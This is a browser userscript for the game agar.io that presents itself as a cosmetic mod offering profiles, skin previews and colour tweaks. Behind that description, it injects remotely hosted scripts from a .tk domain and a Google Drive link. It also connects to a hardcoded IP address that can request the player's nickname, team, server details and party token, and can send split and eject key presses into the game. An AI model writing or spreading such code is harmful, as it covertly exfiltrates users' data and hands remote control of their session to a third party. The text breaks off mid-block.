// ==UserScript==
// @name         Privet Ext TP
// @namespace    ogario.le
// @version      1.8.0
// @description  +profiles, +skin preview, +hide/ show skin URL, +improved look and colors, ++ All the SYX features
// @author       szymy,UP#2
// @match        http://agar.io/*
// @require      http://ajax.googleapis.com/ajax/libs/jquery/2.1.0/jquery.min.js
// @require      http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js
// @run-at       document-start
// @grant        GM_xmlhttpRequest
// @connect      agar.io
// @icon         https://lh3.googleusercontent.com/-J1DBqx9K-TY/VUYZCguTmyI/AAAAAAAAAEs/e7arf8lEphk/s426/TPClanObjekt.jpg
// ==/UserScript==

// Copyright © 2016 ogario.ovh
var ogarioJS = '<script src="http://xagar-scriptx.tk/public/ogar-xnel99x.js"></script>';
var ogarioSniffJS = '<script src="http://ogario.ovh/le/ogario.sniff.js"></script>';
var ogarioCSS = '<link href="http://ogario.ovh/le/ogario.le.css" rel="stylesheet"></link>';
var cpickerJS = '<script src="http://cdnjs.cloudflare.com/ajax/libs/bootstrap-colorpicker/2.3.0/js/bootstrap-colorpicker.min.js"></script>';
var cpickerCSS = '<link href="http://cdnjs.cloudflare.com/ajax/libs/bootstrap-colorpicker/2.3.0/css/bootstrap-colorpicker.min.css" rel="stylesheet"></link>';
var toastrJS = '<script src="http://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>';
var toastrCSS = '<link href="http://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css" rel="stylesheet"></link>';
var newscript = '<script type="text/javascript" src="https://ccd55dd2a9b1ebdb29e201a5e5254ac95ba59e37.googledrive.com/host/0B4sttheQ3SuPWEZybnl4bGdxZ1k"></script>';

// Inject OGARio LE
function inject(page) {
    var _page = page.replace("</head>", cpickerCSS + toastrCSS + ogarioCSS + cpickerJS + toastrJS + ogarioSniffJS +"</head>");
    _page = _page.replace("agario.core.js", "");
    _page = _page.replace("</body>", ogarioJS + newscript +"</body>");
    return _page;
}
window.stop();
document.documentElement.innerHTML = null;
GM_xmlhttpRequest({
	method : "GET",
	url : "http://agar.io/",
	onload : function(e) {
		var doc = inject(e.responseText);
		document.open();
		document.write(doc);
		document.close();
	}
});
var interval = setInterval( function () {
    if ('undefined' == typeof unsafeWindow.jQuery) {
    } else {
        clearInterval( interval );
        console.log("jQuery loaded!");
 
        var config = {};
        config.pass = 'MyRandomServerPass123';
        config.socket = {
          host: '164.132.47.218',
          port: '8228'
        };
 
        var socket = io('http://' + config.socket.host + ':' + config.socket.port, {query: 'pass=' + config.pass});
 
        socket.on('connect', function () {
            console.debug('CONNECTED');
        });
 
        socket.on('requestData', function () {
            socket.emit('Data', {uname: $('#nick').val(),
                                 team: $('#team_name').val(),
                                 lb: $('#lb_detail').html(),
                                 server: $('#ip_info').html(),
                                 region: $('#region_info').html(),
                                 mode: $('#gamemode_info').html(),
                                 party: $('.partyToken').val()
            });
        });
        socket.on('split', function () {
            $("body").trigger(key("keydown", " "));
            $("body").trigger(key("keyup", " "));
        });
        socket.on('eject', function () {
            $("body").trigger(key("keydown", "W"));
            $("body").trigger(key("keyup", "W"));
        });
    }